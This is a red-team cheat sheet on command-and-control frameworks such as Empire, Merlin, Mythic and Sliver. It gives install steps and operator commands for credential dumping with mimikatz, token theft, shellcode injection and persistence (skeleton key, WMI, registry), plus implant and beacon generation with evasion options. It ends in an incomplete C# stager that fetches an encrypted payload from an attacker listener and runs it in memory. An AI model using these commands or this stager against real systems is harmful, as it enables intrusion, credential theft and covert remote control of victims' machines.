# Command and Control

- [Resources](#resources)

## Table of Contents

- [Covenant](#covenant)
- [Empire](#empire)
- [Hak5 Cloud C2](#hak5-cloud-c2)
- [Havoc](#havoc)
- [Merlin](#merlin)
- [Mythic](#mythic)
- [Redirector](#redirector)
- [Sliver](#sliver)
- [Villain](#villain)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AzureC2Relay | AzureC2Relay is an Azure Function that validates and relays Cobalt Strike beacon traffic by verifying the incoming requests based on a Cobalt Strike Malleable C2 profile. | https://github.com/Flangvik/AzureC2Relay |
| Brute Ratel | A Customized Command and Control Center for Red Team and Adversary Simulation | https://bruteratel.com/ |
| Cobalt Strike | Adversary Simulation and Red Team Operations | https://www.cobaltstrike.com/ |
| Covenant | Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers. | https://github.com/cobbr/Covenant |
| DeathStar | DeathStar is a Python script that uses Empire's RESTful API to automate gaining Domain and/or Enterprise Admin rights in Active Directory environments using some of the most common offensive TTPs. | https://github.com/byt3bl33d3r/DeathStar |
| Empire | Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. | https://github.com/BC-SECURITY/Empire |
| Hardhat C2 | A c# Command & Control framework | https://github.com/DragoQCC/HardHatC2 |
| Havoc | The Havoc Framework | https://github.com/HavocFramework/Havoc |
| KillDefenderBOF | Beacon Object File PoC implementation of KillDefender | https://github.com/Cerbersec/KillDefenderBOF |
| Merlin | Merlin is a cross-platform post-exploitation HTTP/2 Command & Control server and agent written in golang. | https://github.com/Ne0nd0g/merlin |
| Merlin Agent | Post-exploitation agent for Merlin | https://github.com/Ne0nd0g/merlin-agent |
| Merlin Agent Dynamic Link Library (DLL) | This repository contains the very minimal C code file that is used to compile a Merlin agent into a DLL. | https://github.com/Ne0nd0g/merlin-agent-dll | 
| MoveKit | Cobalt Strike kit for Lateral Movement | https://github.com/0xthirteen/MoveKit |
| Mythic | A cross-platform, post-exploit, red teaming framework built with python3, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming. | https://github.com/its-a-feature/Mythic |
| Nightmangle | Nightmangle is post-exploitation Telegram Command and Control (C2/C&C) Agent, created by @1N73LL1G3NC3. | https://github.com/1N73LL1G3NC3x/Nightmangle |
| NimPlant | A light-weight first-stage C2 implant written in Nim. | https://github.com/chvancooten/NimPlant |
| Nuages | A modular C2 framework | https://github.com/p3nt4/Nuages |
| PoshC2 | A proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement. | https://github.com/nettitude/PoshC2 |
| REC2 (Rusty External C2) | REC2 (Rusty External Command and Control) is client and server tool allowing auditor to execute command from VirusTotal and Mastodon APIs written in Rust. 🦀 | https://github.com/g0h4n/REC2 |
| RedWarden | Cobalt Strike C2 Reverse proxy that fends off Blue Teams, AVs, EDRs, scanners through packet inspection and malleable profile correlation | https://github.com/mgeeky/RedWarden |
| SharpC2 | Command and Control Framework written in C# | https://github.com/rasta-mouse/SharpC2 |
| SILENTTRINITY | An asynchronous, collaborative post-exploitation agent powered by Python and .NET's DLR | https://github.com/byt3bl33d3r/SILENTTRINITY |
| Sliver | Sliver is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing. | https://github.com/BishopFox/sliver |
| SharpLAPS | Retrieve LAPS password from LDAP | https://github.com/swisskyrepo/SharpLAPS |
| SPAWN | Cobalt Strike BOF that spawns a sacrificial process, injects it with shellcode, and executes payload. Built to evade EDR/UserLand hooks by spawning sacrificial process with Arbitrary Code Guard (ACG), BlockDll, and PPID spoofing. | https://github.com/boku7/SPAWN |
| Villain | Villain is a C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features (commands, utilities etc) and share them among connected sibling servers (Villain instances running on different machines). | https://github.com/t3l3machus/Villain |

## Covenant

> https://github.com/cobbr/Covenant

> https://github.com/cobbr/Covenant/wiki/Installation-And-Startup

### Prerequisites

```c
$ sudo apt-get install docker docker-compose
```

### Installation

```c
$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ cd Covenant/Covenant
$ docker build -t covenant .
```

```c
$ docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

or

```c
$ docker run -d -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant
```

> https://127.0.0.1:7443/covenantuser/login

### Stop Covenant

```c
$ docker stop covenant
```

### Restart Covenant

```c
$ docker start covenant -ai
```

### Remove and Restart Covenant

```c
$ ~/Covenant/Covenant > docker rm covenant
$ ~/Covenant/Covenant > docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /PATH/TO/Covenant/Covenant/Data:/app/Data covenant --username AdminUser --computername 0.0.0.0
```

## Empire

> https://github.com/BC-SECURITY/Empire

### Installation

```c
$ git clone --recursive https://github.com/BC-SECURITY/Empire.git
$ cd Empire
$ ./setup/checkout-latest-tag.sh
$ ./setup/install.sh
```

```c
$ ./ps-empire server
```

```c
$ ./ps-empire client
```

### Starkiller

> http://127.0.0.1:1337/index.html

### Common Commands

```c
(Empire) > listeners                      // list current running listeners
(Empire) > uselistener                    // configure listener
(Empire) > agents                         // list available agents
(Empire) > kill <NAME>                    // kill a specific agent
(Empire: listeners/http) > info           // provide information about used listener or module
(Empire: listeners/http) > back           // get back from current menu
(Empire: listeners) > usestager           // creating payloads
(Empire: agents) > rename <NAME> <NAME>   // renaming specific agent
(Empire: agents) > interact <NAME>        // interacting with specific agent
(Empire: agents) > searchmodule <NAME>    // search for a specific module
(Empire: <NAME>) > usemodule <NAME>       // use a specific module
(Empire: <NAME>) > sysinfo                // show system information
(Empire: <NAME>) > creds                  // show credentials
(Empire: <NAME>) > download               // download files
(Empire: <NAME>) > upload                 // upload files
(Empire: <NAME>) > sleep <60>             // set agent communication to sleep for 60 seconds
(Empire: <NAME>) > steal_token            // impersonate access token
(Empire: <NAME>) > shell [cmd]            // open a shell with cmd.exe
(Empire: <NAME>) > ps                     // show running processes
(Empire: <NAME>) > psinject               // inject agent to another process
(Empire: <NAME>) > scriptimport           // load powershell script
(Empire: <NAME>) > mimikatz               // executes sekurlsa::logonpasswords
(Empire: <NAME>) > usemodule privesc/getsystem            // try privilege escalation
(Empire: <NAME>) > usemodule privesc/sherlock             // run sherlock
(Empire: <NAME>) > usemodule privesc/powerup/allchecks    // perform privilege escalation checks
(Empire: <NAME>) > usemodule situational_awareness/host/antivirusproduct    // provides information about antivirus products
(Empire: <NAME>) > usemodule situational_awareness/host/applockerstatus     // provides information about applocker status
(Empire: <NAME>) > usemodule situational_awareness/host/computerdetails     // provides information about event ids 4648 (RDP) and 4624 (successful logon)
(Empire: <NAME>) > situational_awareness/network/get_spn                       // provides information about spns
(Empire: <NAME>) > situational_awareness/network/powerview/get_domain_trust    // show information about domain trusts
(Empire: <NAME>) > situational_awareness/network/powerview/map_domain_trust    // map information about domain trust
(Empire: <NAME>) > situational_awareness/network/bloodhound3                   // load bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > set CollectionMethodAll    // configure bloodhound module
(Empire: <NAME>/situational_awareness/network/bloodhound3) > run                        // run the module
(Empire: <NAME>) > download *bloodhound*                                                // download the module
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry    // registry persistence
(Empire: <NAME>) > usemodule persistence/misc/add_sid_history            // sid history persistence
(Empire: <NAME>) > usemodule persistence/misc/memssp                     // ssp persistence
(Empire: <NAME>) > usemodule persistence/misc/skeleton_key               // skeleton key persistence
(Empire: <NAME>) > usemodule persistence/elevated/wmi                    // wmi persistence
```

### Setup HTTP Listener

```c
(Empire) > listeners http
(Empire: listeners/http) > info
(Empire: listeners/http) > set Name <NAME>
(Empire: listeners/http) > set Host <LHOST>
(Empire: listeners/http) > set Port <PORT>
(Empire: listeners/http) > exeute
```

### Setup Stager

```c
(Empire: listeners) > usestager multi/bash
(Empire: listeners/multi/bash) > set Listener <NAME>
(Empire: listeners/multi/bash) > set OutFile /PATH/TO/FILE/<FILE>.sh
(Empire: listeners/multi/bash) > execute
```

### Setup Persistence Measures

```c
(Empire: <NAME>) > usemodule powershell/persistence/elevated/registry
(Empire: <NAME>/powershell/persistence/elevated/registry) > set Listener <NAME>
(Empire: <NAME>/powershell/persistence/elevated/registry) > run
```

## Hak5 Cloud C2

```c
$ ./c2-3.3.0_amd64_linux -hostname 127.0.0.1 -listenip 127.0.0.1
```

> http://127.0.0.1:8080

## Havoc

> https://github.com/HavocFramework/Havoc

### Python Environment

```c
$ sudo apt-get install build-essential
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt-get update
$ sudo apt-get install python3.10 python3.10-dev
```

### Prerequisites

```c
$ sudo apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev libspdlog-dev python3-dev libboost-all-dev mingw-w64 nasm
```

### Installation

#### Building Client

```c
user@host:/opt$ sudo git clone https://github.com/HavocFramework/Havoc.git
user@host:/opt$ cd Havoc/Client
user@host:/opt/Havoc/Client$ make 
user@host:/opt/Havoc/Client$ ./Havoc
```

#### Building Teamserver

```c
user@host:/opt/Havoc/Teamserver$ go mod download golang.org/x/sys
user@host:/opt/Havoc/Teamserver$ go mod download github.com/ugorji/go
user@host:/opt/Havoc/Teamserver$ ./Install.sh
user@host:/opt/Havoc/Teamserver$ make
user@host:/opt/Havoc/Teamserver$ ./teamserver -h
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Teamserver

```c
user@host:/opt/Havoc/Teamserver$ sudo ./teamserver server --profile ./profiles/havoc.yaotl -v --debug
```

### Start Client

```c
user@host:/opt/Havoc/Client$ ./Havoc
```

## Merlin

> https://github.com/Ne0nd0g/merlin

> https://github.com/Ne0nd0g/merlin-agent

> https://github.com/Ne0nd0g/merlin-agent-dll

> https://merlin-c2.readthedocs.io/en/latest/index.html

### Installation

```c
$ mkdir /opt/merlin;cd /opt/merlin
$ wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
$ 7z x merlinServer-Linux-x64.7z
$ sudo ./merlinServer-Linux-x64
$ ./data/bin/merlinCLI-Linux-x64
```

### Service Configuration

```c
/etc/systemd/system/merlin.service
```

```c
[Unit]
Description=Merlin

[Service]
ExecStart=/PATH/TO/BINARY/merlinServer-Linux-x64
Type=Simple

[Install]
WantedBy=multi-user.target
```

```c
$ systemctl enable merlin.service
$ systemctl start merlin.service
```

### Common Commands

```c
Merlin» help
Merlin» main
Merlin» ! <COMMAND>
Merlin» jobs
Merlin» queue
Merlin» clear
Merlin» modules
Merlin» interact
Merlin» listeners
Merlin» sessions
Merlin» socks
Merlin» reconnect
Merlin» remove
```

### Grouping

```c
Merlin» group add <AGENT> <GROUP>
Merlin» list <GROUP> 
Merlin» remove <AGENT> <GROUP>
```

### Listeners

> https://merlin-c2.readthedocs.io/en/latest/cli/menu/listeners.html

#### Common Commands

```c
Merlin[listeners]» list
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» status
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» start
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» stop
Merlin[listeners][e2d9e800-78cc-4347-a232-ce767db508cd]» delete
```

#### Usage

```c
Merlin» listeners
Merlin[listeners]» use https
Merlin[listeners][HTTPS]» info
Merlin[listeners][HTTPS]» set Interface 0.0.0.0
Merlin[listeners][HTTPS]» set Port <LPORT>
Merlin[listeners][HTTPS]» set PSK <PSK>
Merlin[listeners][HTTPS]» run
Merlin[listeners][HTTPS]» listeners
Merlin[listeners]» list
Merlin[listeners]» interact e2d9e800-78cc-4347-a232-ce767db508cd
```

### Agents

> https://github.com/Ne0nd0g/merlin-agent

> https://github.com/Ne0nd0g/merlin-agent-dll

#### Agent Installation

```c
$ go install github.com/Ne0nd0g/merlin-agent@latest
$ go install github.com/Ne0nd0g/merlin-agent-dll@latest
```

#### Agent Download

```c
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Windows-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Linux-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent/releases/download/v2.3.0/merlinAgent-Darwin-x64.7z
$ wget https://github.com/Ne0nd0g/merlin-agent-dll/releases/download/v2.2.0/merlin-agent-dll.7z
```

#### Build Commands

```c
$ make windows
$ make linux
$ make darwin
$ make mips
$ make arm
```

#### Custom Build Commands

> https://merlin-c2.readthedocs.io/en/latest/agent/custom.html

Please note that you have to be inside the `agent folder` for building agents.

##### Basic Build with no Customization

```c
$ make windows DIR="./output"
```

###### Sample Output

```c
export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=127.0.0.1:4444" -X "main.transforms=jwe,gob-base" -X "main.listener=" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://127.0.0.1:443" -X "main.host=" -X "main.psk=merlin" -X "main.secure=false" -X "main.sleep=30s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=7" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
```

##### Custom Build with customized Parameters

```c
$ make windows ADDR="<LHOST>" DIR="./output" AUTH="opaque" LISTENER="732e296e-7856-4914-961b-b4ba74972b54" KILLDATE="0" RETRY="10" PAD="4096" PROTO="h2" PSK="<PSK>" SKEW="3000" SLEEP="10s" URL="https://<LHOST>:<LPORT>/" USERAGENT="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
```

###### Sample Output

```c
export GOOS=windows GOARCH=amd64;go build -trimpath -ldflags '-s -w -X "main.auth=opaque" -X "main.addr=<LHOST>" -X "main.transforms=jwe,gob-base" -X "main.listener=732e296e-7856-4914-961b-b4ba74972b54" -X "github.com/Ne0nd0g/merlin-agent/v2/core.Build=f0624a3082928d01eaa86a0fb101b0d1d72cde02" -X "main.protocol=h2" -X "main.url=https://<LHOST>:<LPORT>/" -X "main.host=" -X "main.psk=<PSK>" -X "main.secure=false" -X "main.sleep=10s" -X "main.proxy=" -X "main.useragent=Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36" -X "main.headers=" -X "main.skew=3000" -X "main.padding=4096" -X "main.killdate=0" -X "main.maxretry=10" -X "main.parrot=" -H=windowsgui -buildid=' -gcflags=all=-trimpath= -asmflags=all=-trimpath= -o ./output/merlinAgent-Windows-x64.exe ./main.go
```

#### Common Commands

```c
Merlin» interact <AGENT>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» checkin
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» clear
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» connect
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» info
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» note
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» maxretry
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» skew
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sleep
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» killdate
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» jobs
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» socks
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» printenv
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ifconfig
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pwd
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ls
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» download
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» nslookup
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ssh
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rm
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sdelete
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» touch
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» exit
```

##### Examples

```c
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» env showall
```

#### Linux Specific Commands

```c
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memfd
```

#### Windows Specific Commands

```c
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» ps
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» pipes
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» netstat
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» runas
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» make_token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» steal_token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» token
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» rev2self
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» list-assemblies
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» memory
```

##### Examples

```c
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-assembly /PATH/TO/BINARY/<BINARY> <OPTION> "C:\\Windows\\System32\\WerFault.exe"
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe"
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-pe /PATH/TO/BINARY/mimikatz.exe "coffee exit" "C:\\Windows\\System32\\WerFault.exe" <COMMENT>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode rtlcreateuserthread <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc <PID> <SHELLCODE>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-assembly /PATH/TO/BINARY/<BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» invoke-assembly <BINARY> <OPTION>
Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» load-clr v4.0
```

#### Example Usage

```c
Merlin» listeners
Merlin[listeners]» use https
Merlin[listeners][HTTPS]» info
Merlin[listeners][HTTPS]» set Interface 0.0.0.0
Merlin[listeners][HTTPS]» set Port <LPORT>
Merlin[listeners][HTTPS]» set PSK <PSK>
Merlin[listeners][HTTPS]» run
```

```c
Merlin» sessions
```

```c
Merlin» interact 2711ef1d-0b53-490d-add9-7ae3c0878b07 
Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» info
```

##### Fixing Error Message: Orphaned Agent JWT detected. Returning 401 instructing the Agent to generate a self-signed JWT and try again.

```c
Merlin[agent][2711ef1d-0b53-490d-add9-7ae3c0878b07]» rev2self
```

#### Cloud Fronting

```c
$ make linux URL=http://<>DOMAIN/ HOST=<LHOST> PROTO=http PSK=<PSK>
```

### SOCKS Proxy

```c
Merlin» socks list
Merlin» socks start <PORT> <AGENT>
Merlin» socks stop <PORT> <AGENT>
```

## Mythic

> https://github.com/its-a-feature/Mythic

> https://docs.mythic-c2.net/

> https://github.com/MythicAgents

> https://github.com/MythicC2Profiles

### Installation

```c
$ sudo apt-get install build-essential ca-certificates curl docker.io docker-compose gnupg gpg mingw-w64 g++-mingw-w64 python3-docker
$ git clone https://github.com/its-a-feature/Mythic.git
$ cd Mythic/
$ sudo make
```

### Install HTTP C2 Profile

```c
$ sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```

### Install Mythic Agents

```c
$ sudo ./mythic-cli install github https://github.com/MythicAgents/apfell.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/arachne.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/freyja.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/hermes.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Medusa.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/merlin.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/Nimplant.git
$ sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon.git
```

### Finalize the Installation

Check the `.env` file to grab the credentials for the `mythic_admin` user.

```c
$ cat .env
```

> https://127.0.0.1:7443

## Redirector

### Socat

```c
$ socat TCP4-LISTEN:<LPORT>,fork TCP4:<LHOST>:<LPORT>
```

## Sliver

> https://github.com/BishopFox/sliver

> https://sliver.sh/docs?name=Stagers

> https://sliver.sh/docs?name=HTTPS+C2

> https://sliver.sh/docs?name=Getting+Started

> https://sliver.sh/docs?name=Getting+Started

### Installation

```c
$ curl https://sliver.sh/install | sudo bash
```

### Quick Start

Download the latest `sliver-server` binary and execute it.

> https://github.com/BishopFox/sliver/releases

```c
$ ./sliver-server_linux 

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...
[*] Loaded 20 aliases from disk
[*] Loaded 104 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain evolve
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options
```

```c
[server] sliver > multiplayer

[*] Multiplayer mode enabled!
```

```c
[server] sliver > generate --http <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/FOLDER/
```

```c
[server] sliver > http
```

### Administration

```c
sliver > version
sliver > players
sliver > armory
sliver > armory install all
```

### Multiplayer

#### Register a new Operator

```c
root@c2:~# ./sliver-server operator --name <USERNAME> --lhost 127.0.0.1 --save /home/<USERNAME>/.sliver/configs/<USERNAME>.cfg
```

```c
root@c2:~/.sliver/configs$ chown <USERNAME>:<USERNAME> *.cfg
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Register a new Operator directly on the Sliver Server

```c
[server] sliver > multiplayer
```

```c
[server] sliver > new-operator --name <USERNAME> --lhost <LHOST>
```

```c
username@c2:~/.sliver/configs$ sliver import <USERNAME>.cfg
```

#### Kick Operator

```c
[server] sliver > kick-operator -n <USERNAME>
```

### Implant and Beacon Creation 

```
sliver > help generate
sliver > generate --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
sliver > generate --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
sliver > generate stager --lhost <LHOST> --os windows --arch amd64 --format c --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --disable-sgn --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shared --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format service --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --save /PATH/TO/BINARY/
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST>:<LPORT> --os windows --arch amd64 --format exe --save /PATH/TO/BINARY/ --seconds 5 --jitter 3
sliver > generate beacon --mtls <LHOST> --os windows --arch amd64 --format shellcode --disable-sgn --skip-symbols --name <NAME> --save /PATH/TO/BINARY/
sliver > generate beacon --http <LHOST> --os windows --arch amd64 --format shellcode --skip-symbols --name <NAME> --save /PATH/TO/BINARY/ -G
sliver > generate beacon --http <LHOST>?proxy=http://<LHOST>:8080,<LHOST>?driver=wininet --os windows --arch amd64 --format shellcode --seconds 30 --jitter 3 --name <NAME> --save /PATH/TO/BINARY/<FILE>.bin -G --skip-symbols
```

### Profiles, Listener and Stagers

> https://sliver.sh/docs

#### Profiles

```c
sliver > profiles new --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
sliver > profiles new beacon --mtls <LHOST>:<LPORT> --arch amd64 --format shellcode --skip-symbols <PROFILE>
```

#### Listener

```c
sliver > stage-listener --url tcp://<LHOST>:<LPORT> --profile <PROFILE>
```

##### Encrypted Listener

```c
sliver > stage-listener --url http://<LHOST>:<LPORT> --profile <PROFILE> --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

```c
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Sliver_stager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t";
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://<LHOST>:<LPORT>/<NAME>.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void DownloadAndExecute()
